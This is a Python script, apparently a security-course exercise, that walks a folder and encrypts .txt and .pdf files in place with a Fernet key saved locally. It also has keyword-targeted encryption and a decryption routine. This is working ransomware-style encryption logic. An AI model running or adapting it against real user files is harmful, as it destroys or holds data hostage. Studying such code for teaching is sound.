import os
import string
from cryptography.fernet import Fernet

# safeguard = input("Please enter the safeguard password:")
# if safeguard != 'start':
#     quit()

#creates list of files of certain extensions within given folder
def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf',)
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_path,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    return file_paths

#creates fernet key and writes it to text file
def write_key():
    key = Fernet.generate_key()

    with open('filekey.txt', 'wb') as filekey:
        filekey.write(key)

#reads and returns key stored in filekey.txt
def read_key():
    try:
        with open('filekey.txt', 'rb') as filekey:
            key = filekey.read()

        fernet = Fernet(key)
        return fernet
    except:
        print("The key does not exist")


#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            encrypted = fernet.encrypt(file.read())
        
        #overwrite the original with the new encrypted version
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet):
    for f in file_paths:
        #create decrypted version of the file
        with open(f, 'rb') as enc_file:
            decrypted = fernet.decrypt(enc_file.read())
        
        #overwrite the original with the new decrypted version
        with open(f, 'wb') as dec_file:
            dec_file.write(decrypted)

#returns whether a keyword was found in a file (only tested with .txt)
def keyword_check(keyword, f):
    file = open(f, 'r').read()
    for word in file.split():       
        word = word.translate(str.maketrans('', '', string.punctuation))
        if word.lower() == keyword:
            return True
    return False

#returns whether a file is encrypted or not
def isEncrypted(f):
    #probably not the best of way of doing this, only tested with txt files
    #would also let an unencrypted file that starts with gAAA for whatever reason accidentally return true
    file = open(f, 'r').read()
    return file[0:4] == "gAAA"


#sequence to generate a new key and encrypt files with it
def encrypt(file_paths):
    write_key()
    fernet = read_key()

    for f in file_paths:
        print(f)

    encrypt_files(file_paths, fernet)

#sequence to generate a new key and encrypt files that contain a specific keyword
def encrypt_keyword(file_paths, keyword):
    write_key()
    fernet = read_key()

    target_file_paths = []

    for f in file_paths:
        if (keyword_check(keyword, f)):
            target_file_paths.append(f)
            print(f)

    encrypt_files(target_file_paths, fernet)

#sequence to decrypt the already encrypted files using the key that already exists
def decrypt(file_paths):
    fernet = read_key()
    if (fernet != None):
        target_file_paths = []

        for f in file_paths:
            if (isEncrypted(f)):
                target_file_paths.append(f)
                print(f)

        if (len(target_file_paths) == 0):
            print("No files were encrypted")
        else:
            decrypt_files(target_file_paths, fernet)

def main():
    #will need to get current working directory or something later
    file_paths = generate_file_list('C:\\Users\\ericw\\Documents\\CECS378Test')

    # encrypt_keyword(file_paths, "a")
    # decrypt(file_paths)

if __name__ == "__main__":
    main()


